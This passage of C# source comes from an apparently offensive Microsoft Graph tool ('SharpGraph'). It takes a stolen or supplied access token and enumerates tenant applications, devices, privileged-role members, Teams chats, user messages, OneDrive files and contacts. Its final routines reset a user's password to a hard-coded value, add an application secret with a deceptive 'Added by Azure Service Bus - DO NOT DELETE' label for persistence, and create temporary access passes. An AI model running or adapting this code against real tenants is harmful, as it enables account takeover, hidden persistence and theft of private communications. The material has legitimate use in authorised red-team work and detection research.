                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-ExternalConnections", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-ExternalConnections");
                string apiUrl = "https://graph.microsoft.com/v1.0/external/connections";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-Applications", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-Applications");
                string apiUrl = "https://graph.microsoft.com/v1.0/applications";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-ServicePrincipals", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-ServicePrincipals");
                string apiUrl = "https://graph.microsoft.com/v1.0/servicePrincipals";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-CrossTenantAccessPolicy", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-CrossTenantAccessPolicy");
                string apiUrl = "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-PartnerCrossTenantAccessPolicy", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-PartnerCrossTenantAccessPolicy");
                string apiUrl = "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/templates/multiTenantOrganizationPartnerConfiguration";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-Tenants", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-Tenants");
                string apiUrl = "https://graph.microsoft.com/v1.0/tenantRelationships/multiTenantOrganization/tenants";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-Devices", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-Devices");
                string apiUrl = "https://graph.microsoft.com/v1.0/devices";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-AdministrativeUnits", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-AdministrativeUnits");
                string apiUrl = "https://graph.microsoft.com/v1.0/directory/administrativeUnits";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-AdministrativeUnitMember", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.id))
                {
                    Console.WriteLine("\n[!] No ID supplied");
                    Console.WriteLine("SharpGraph.exe Get-AdministrativeUnitMember -id <admin unit id> -token <access token>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Get-AdministrativeUnitMember");
                    string apiUrl = $"https://graph.microsoft.com/v1.0/directory/administrativeUnits/{Config.id}/members";

                    if (!string.IsNullOrEmpty(Config.select))
                    {
                        apiUrl += "?$select=" + Config.select;
                    }

                    await GraphApiGET(Config.accessToken, apiUrl);
                }
            }

            if (string.Equals(command, "List-JoinedTeams", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-JoinedTeams");
                string apiUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/joinedTeams" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/joinedTeams";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-Chats", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-Chats");
                string apiUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/chats" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/chats";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-UserChatMessages", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.id))
                {
                    Console.WriteLine("\n[!] No ID supplied");
                    Console.WriteLine("SharpGraph.exe Get-UserChatMessages -id <user id or upn> -token <access token>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Get-UserChatMessages");
                    string apiUrl = $"https://graph.microsoft.com/v1.0/users/{Config.id}/chats/getAllMessages";

                    if (!string.IsNullOrEmpty(Config.select))
                    {
                        apiUrl += "?$select=" + Config.select;
                    }

                    await GraphApiGET(Config.accessToken, apiUrl);
                }
            }

            if (string.Equals(command, "Get-oauth2PermissionGrants", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-oauth2PermissionGrants");
                string apiUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/oauth2PermissionGrants";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-UserPermissionGrants", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.id))
                {
                    Console.WriteLine("\n[!] No ID supplied");
                    Console.WriteLine("SharpGraph.exe Get-UserPermissionGrants -id <app id> -token <access token>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Get-UserPermissionGrants");
                    string apiUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/permissionGrants" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/permissionGrants";

                    if (!string.IsNullOrEmpty(Config.select))
                    {
                        apiUrl += "?$select=" + Config.select;
                    }

                    await GraphApiGET(Config.accessToken, apiUrl);
                }
            }

            if (string.Equals(command, "List-OneDrives", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-OneDriveFiles");
                /*
                 * GET /groups/{groupId}/drives
                 * GET /sites/{siteId}/drives
                 * GET /users/{userId}/drives
                 * GET /me/drives
                 */
                string apiUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/drives" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/drives"; // use -Query for above options

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-RecentOneDriveFiles", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-RecentOneDriveFiles");
                string apiUrl = "https://graph.microsoft.com/v1.0/me/drive/recent"; // only permitted for /me

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "List-SharedOneDriveFiles", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] List-SharedOneDriveFiles");
                string apiUrl = "https://graph.microsoft.com/v1.0/me/drive/sharedWithMe"; // only permitted for /me

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-OneDriveFiles", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-OneDriveFiles");
                /*
                GET /drives/{drive-id}/items/{item-id}/children
                GET /groups/{group-id}/drive/items/{item-id}/children
                GET /me/drive/items/{item-id}/children
                GET /sites/{site-id}/drive/items/{item-id}/children
                GET /users/{user-id}/drive/items/{item-id}/children
                */
                string apiUrl = "https://graph.microsoft.com/v1.0/me/drive/root/children";  // default /me, use -Query for other options
                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-AppRoleAssignments", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-AppRoleAssignments");
                string apiUrl = string.IsNullOrEmpty(Config.id) ? "https://graph.microsoft.com/v1.0/me/appRoleAssignments" : $"https://graph.microsoft.com/v1.0/users/{Config.id}/appRoleAssignments"; // use -Query for other options

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-CurrentUserActivity", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-CurrentUserActivity");
                string apiUrl = "https://graph.microsoft.com/v1.0/me/activities";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            if (string.Equals(command, "Get-PersonalContacts", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Get-PersonalContacts");
                string apiUrl = "https://graph.microsoft.com/v1.0/me/contacts";

                if (!string.IsNullOrEmpty(Config.select))
                {
                    apiUrl += "?$select=" + Config.select;
                }

                await GraphApiGET(Config.accessToken, apiUrl);
            }

            // Custom API Query
            if (string.Equals(command, "Invoke-CustomQuery", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.query))
                {
                    Console.WriteLine("\n[!] Query API endpoint not supplied");
                    Console.WriteLine("SharpGraph.exe Invoke-Query -Query \"https://graph.microsoft.com/v1.0/sites/{siteId}/drives\" -token <access token>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Invoke-CustomQuery");

                    if (!string.IsNullOrEmpty(Config.select))
                    {
                        Config.query += "?$select=" + Config.select;
                    }

                    await GraphApiGET(Config.accessToken, Config.query);
                }
            }

            // Search 
            if (string.Equals(command, "Invoke-Search", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.searchString) || string.IsNullOrEmpty(Config.entity))
                {
                    Console.WriteLine("\n[!] Search string or entity not supplied");
                    Console.WriteLine("SharpMgGraph.exe Invoke-Search -search \"keyword\" -entity \"entity\" -token <access token>");
                    Console.WriteLine("Entity Types: driveItem, message, chatMessage, site, event");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Invoke-Search");
                    string apiUrl = "https://graph.microsoft.com/v1.0/search/query";

                    // Config.select won't work on post req
                    // add queryTemplate in POST body to refine results

                    await InvokeSearch(Config.accessToken, Config.searchString, Config.entity, apiUrl);
                }
            }

            // Privileged Role Search
            var roles = new[]
            {
                // more here: https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference#role-template-ids
                new { displayName = "Password Administrator", roleTemplateId = "966707d0-3269-4727-9be2-8c3a10f19b9d" },
                new { displayName = "Global Reader", roleTemplateId = "f2ef992c-3afb-46b9-b7cf-a126ee74c451" },
                new { displayName = "Directory Synchronization Accounts", roleTemplateId = "d29b2b05-8046-44ba-8758-1e26182fcf32" },
                new { displayName = "Security Reader", roleTemplateId = "5d6b6bb7-de71-4623-b4af-96380a352509" },
                new { displayName = "Privileged Authentication Administrator", roleTemplateId = "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" },
                new { displayName = "Azure AD Joined Device Local Administrator", roleTemplateId = "9f06204d-73c1-4d4c-880a-6edb90606fd8" },
                new { displayName = "Authentication Administrator", roleTemplateId = "c4e39bd9-1100-46d3-8c65-fb160da0071f" },
                new { displayName = "Groups Administrator", roleTemplateId = "fdd7a751-b60b-444a-984c-02652fe8fa1c" },
                new { displayName = "Application Administrator", roleTemplateId = "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3" },
                new { displayName = "Helpdesk Administrator", roleTemplateId = "729827e3-9c14-49f7-bb1b-9608f156bbb8" },
                new { displayName = "Directory Readers", roleTemplateId = "88d8e3e3-8f55-4a1e-953a-9b9898b8876b" },
                new { displayName = "User Administrator", roleTemplateId = "fe930be7-5e62-47db-91af-98c3a49a38b1" },
                new { displayName = "Global Administrator", roleTemplateId = "62e90394-69f5-4237-9190-012177145e10" }
            };

            if (string.Equals(command, "Find-PrivilegedRoleUsers", StringComparison.CurrentCultureIgnoreCase))
            {
                Console.WriteLine("\n[*] Find-PrivilegedRoleUsers");

                foreach (var role in roles)
                {
                    Console.WriteLine($"[+] Role: {role.displayName}");

                    string apiUrl = $"https://graph.microsoft.com/v1.0/directoryRoles(roleTemplateId=\'{role.roleTemplateId}\')/members";

                    if (!string.IsNullOrEmpty(Config.select))
                    {
                        apiUrl += "?$select=" + Config.select;
                    }

                    await GraphApiGET(Config.accessToken, apiUrl);
                }
            }


            // passwordProfile update
            if (string.Equals(command, "Update-UserPassword", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.id))
                {
                    Console.WriteLine("\n[!] No ID supplied");
                    Console.WriteLine("SharpGraph.exe Update-UserPassword -id <user id or upn> -token <access token>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Update-UserPassword");

                    await UpdateUserPATCH(Config.accessToken, Config.id);
                }
            }


            // Application addPassword 
            if (string.Equals(command, "Add-ApplicationPassword", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.id))
                {
                    Console.WriteLine("\n[!] No ID supplied");
                    Console.WriteLine("SharpGraph.exe Add-ApplicationPassword -id <app id> -token <access token>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Add-ApplicationPassword");

                    //await UpdateUserPATCH(Config.accessToken, Config.id);
                    await AddAppPwPOST(Config.accessToken, Config.id);
                }
            }


            if (string.Equals(command, "Add-UserTAP", StringComparison.CurrentCultureIgnoreCase))
            {
                if (string.IsNullOrEmpty(Config.id))
                {
                    Console.WriteLine("\n[!] No ID supplied");
                    Console.WriteLine("SharpGraph.exe Add-UserTAP -id <user id> -token <access token>");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("\n[*] Add-UserTAP");

                    await NewTAPPOST(Config.accessToken, Config.id);
                }
            }
        }


            // Base GET Request Function
            static async Task GraphApiGET(string accessToken, string url)
        {
            try
            {
                string nextPageUrl = url;

                using (var httpClient = new HttpClient())
                {
                    do
                    {
                        httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", accessToken);

                        HttpResponseMessage response = await httpClient.GetAsync(nextPageUrl);
                        response.EnsureSuccessStatusCode();

                        string responseBody = await response.Content.ReadAsStringAsync();

                        var result = JObject.Parse(responseBody);

                        foreach (var property in result)
                        {
                            // omit all the "@odata" properties 
                            if (!property.Key.StartsWith("@odata.context"))
                            {
                                Console.WriteLine($"{property.Key}: {property.Value}");
                            }
                        }

                        // check for next page URL
                        nextPageUrl = result["@odata.nextLink"]?.ToString();

                        if (!string.IsNullOrEmpty(nextPageUrl))
                        {
                            response = await httpClient.GetAsync(nextPageUrl); // new req to next page
                            response.EnsureSuccessStatusCode();
                            responseBody = await response.Content.ReadAsStringAsync();
                        }
                    } while (!string.IsNullOrEmpty(nextPageUrl)); // continue until done
                }
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine($"[!] HTTP Error: {ex.Message}");
            }
        }


        // Base Search Function
        static async Task InvokeSearch(string accessToken, string searchString, string entity, string url)
        {
            try
            {

                using (var httpClient = new HttpClient())
                {
                    do
                    {
                        httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", accessToken);

                        // can't stack entities via httpclient?
                        // -entity flag added
                        string jsonBody = $@"{{
                            ""requests"": [
                                {{
                                    ""entityTypes"": [
                                        ""{entity}"" 
                                    ],
                                    ""query"": {{
                                        ""queryString"": ""{searchString}""
                                    }}
                                }}
                            ]
                        }}";

                        // UPDATE
                        // can use queryTemplate or sort to refine output
                        // https://learn.microsoft.com/en-us/graph/search-concept-query-template
                        /*
                         {
                            "requests": [
                                {
                                    "entityTypes": [
                                        "listItem"
                                    ],
                                    "query": {
                                        "queryString": "contoso",
                                        "queryTemplate": "{searchTerms} CreatedBy:Bob"
                                    }
                                }
                            ]
                        }
                        */

                        var content = new StringContent(jsonBody, Encoding.UTF8, "application/json");
                        HttpResponseMessage response = await httpClient.PostAsync(url, content);
                        response.EnsureSuccessStatusCode();

                        string responseBody = await response.Content.ReadAsStringAsync();
                        var result = JObject.Parse(responseBody);

                        foreach (var property in result)
                        {
                            if (!property.Key.StartsWith("@odata.context"))
                            {
                                Console.WriteLine($"{property.Key}: {property.Value}");
                            }
                        }

                        url = result["@odata.nextLink"]?.ToString();

                        if (!string.IsNullOrEmpty(url))
                        {
                            response = await httpClient.GetAsync(url);
                            response.EnsureSuccessStatusCode();
                            responseBody = await response.Content.ReadAsStringAsync();
                        }
                    } while (!string.IsNullOrEmpty(url));
                }
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine($"[!] HTTP Error: {ex.Message}");
            }
        }


        static async Task UpdateUserPATCH(string accessToken, string id)
        {

            HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", accessToken);

            // Construct the request URL
            string requestUrl = $"https://graph.microsoft.com/v1.0/users/{id}";

            // JSON payload for the update
            string jsonPayload = @"
            {
                ""passwordProfile"": {
                    ""forceChangePasswordNextSignIn"": false,
                    ""password"": ""NewUserSecret@Pass!""
                }
            }";

            // Create a PATCH request
            var request = new HttpRequestMessage(new HttpMethod("PATCH"), requestUrl)
            {
                Content = new StringContent(jsonPayload, Encoding.UTF8, "application/json")
            };

            // Send the PATCH request
            HttpResponseMessage response = await client.SendAsync(request);

            if (response.IsSuccessStatusCode)
            {
                Console.WriteLine("[+] User password profile updated successfully");
            }
            else
            {
                Console.WriteLine($"[-] Error: {response.StatusCode} - {response.ReasonPhrase}");
                string errorContent = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[-] Error content: {errorContent}");
            }
        }


        static async Task AddAppPwPOST(string accessToken, string id)
        {
            HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", accessToken);

            // Construct the request URL
            string requestUrl = $"https://graph.microsoft.com/v1.0/applications/{id}/addPassword";

            // JSON payload for the request
            string jsonPayload = @"
            {
                ""displayName"": ""Added by Azure Service Bus - DO NOT DELETE"",
                ""endDateTime"": """ + DateTime.UtcNow.AddMonths(6).ToString("yyyy-MM-ddTHH:mm:ssZ") + @"""
            }";

            // Create a POST request
            var request = new HttpRequestMessage(HttpMethod.Post, requestUrl)
            {
                Content = new StringContent(jsonPayload, Encoding.UTF8, "application/json")
            };

            // Send the POST request
            HttpResponseMessage response = await client.SendAsync(request);

            if (response.IsSuccessStatusCode)
            {
                string responseBody = await response.Content.ReadAsStringAsync();
                Console.WriteLine("[+] Password added to application successfully");

                var result = JObject.Parse(responseBody);

                foreach (var property in result)
                {
                    if (!property.Key.StartsWith("@odata.context"))
                    {
                        Console.WriteLine($"{property.Key}: {property.Value}");
                    }
                }
            }
            else
            {
                Console.WriteLine($"[-] Error: {response.StatusCode} - {response.ReasonPhrase}");
                string errorContent = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[-] Error content: {errorContent}");
            }
        }



        // New-TAP

        static async Task NewTAPPOST(string accessToken, string id)
        {
            HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", accessToken);

            // Construct the request URL
            string requestUrl = $"https://graph.microsoft.com/v1.0/users/{id}/authentication/temporaryAccessPassMethods";

            // JSON payload for the request
            string jsonPayload = @"
            {
                ""properties"": {
                    ""isUsableOnce"": true,
                    ""startDateTime"": """ + DateTime.UtcNow.AddMinutes(60).ToString("yyyy-MM-ddTHH:mm:ssZ") + @"""
                }
            }";

            // Create a POST request
            var request = new HttpRequestMessage(HttpMethod.Post, requestUrl)
            {
                Content = new StringContent(jsonPayload, Encoding.UTF8, "application/json")
            };

            // Send the POST request
            HttpResponseMessage response = await client.SendAsync(request);

            if (response.IsSuccessStatusCode)
            {
                string responseBody = await response.Content.ReadAsStringAsync();
                Console.WriteLine("[+] TAP added successfully");

                var result = JObject.Parse(responseBody);

                foreach (var property in result)
                {
                    if (!property.Key.StartsWith("@odata.context"))
                    {
                        Console.WriteLine($"{property.Key}: {property.Value}");
                    }
                }
            }
            else
            {
                Console.WriteLine($"[-] Error: {response.StatusCode} - {response.ReasonPhrase}");
                string errorContent = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[-] Error content: {errorContent}");
            }
        }
    }
}